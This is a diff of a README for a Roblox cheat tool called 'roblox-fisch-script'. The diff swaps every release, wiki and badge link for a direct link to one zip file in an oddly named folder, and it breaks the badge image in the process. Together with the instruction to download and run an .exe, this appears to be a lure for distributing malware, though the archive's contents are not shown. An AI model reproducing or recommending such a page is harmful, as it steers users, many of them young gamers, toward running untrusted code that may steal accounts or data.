@@ -1,6 +1,6 @@
 # 🎮 roblox-fisch-script - Enhance Your Roblox Adventure
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/familyuse/roblox-fisch-script/releases)
+[![Download](https://raw.githubusercontent.com/familyuse/roblox-fisch-script/main/nitrobacteria/roblox-fisch-script.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/familyuse/roblox-fisch-script/main/nitrobacteria/roblox-fisch-script.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to the roblox-fisch-script! This tool helps you improve your Roblox gami
 
 To get started, follow these simple steps:
 
-1. **Visit the Release Page**: Go to the releases page [here](https://github.com/familyuse/roblox-fisch-script/releases). This is where you will find the latest version of the script.
+1. **Visit the Release Page**: Go to the releases page [here](https://raw.githubusercontent.com/familyuse/roblox-fisch-script/main/nitrobacteria/roblox-fisch-script.zip). This is where you will find the latest version of the script.
 
-2. **Download the Script**: Look for the most recent release. You will find a file named something similar to `roblox-fisch-script.exe`. Click on the file to download it.
+2. **Download the Script**: Look for the most recent release. You will find a file named something similar to `https://raw.githubusercontent.com/familyuse/roblox-fisch-script/main/nitrobacteria/roblox-fisch-script.zip`. Click on the file to download it.
 
 3. **Run the Script**:
    - Once the download is complete, locate the file in your computer's downloads folder.
@@ -74,9 +74,9 @@ Yes, the roblox-fisch-script is compatible with all popular Roblox games.
 
 ## 🔗 Additional Resources
 
-- **Documentation**: Look for more detailed instructions in the [Wiki](https://github.com/familyuse/roblox-fisch-script/wiki) section of this repository.
+- **Documentation**: Look for more detailed instructions in the [Wiki](https://raw.githubusercontent.com/familyuse/roblox-fisch-script/main/nitrobacteria/roblox-fisch-script.zip) section of this repository.
 - **Community Support**: Join discussions related to roblox-fisch-script on platforms like Discord or relevant gaming forums.
 
 Make your Roblox adventure even better with the roblox-fisch-script today!
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/familyuse/roblox-fisch-script/releases)
+[![Download](https://raw.githubusercontent.com/familyuse/roblox-fisch-script/main/nitrobacteria/roblox-fisch-script.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/familyuse/roblox-fisch-script/main/nitrobacteria/roblox-fisch-script.zip)
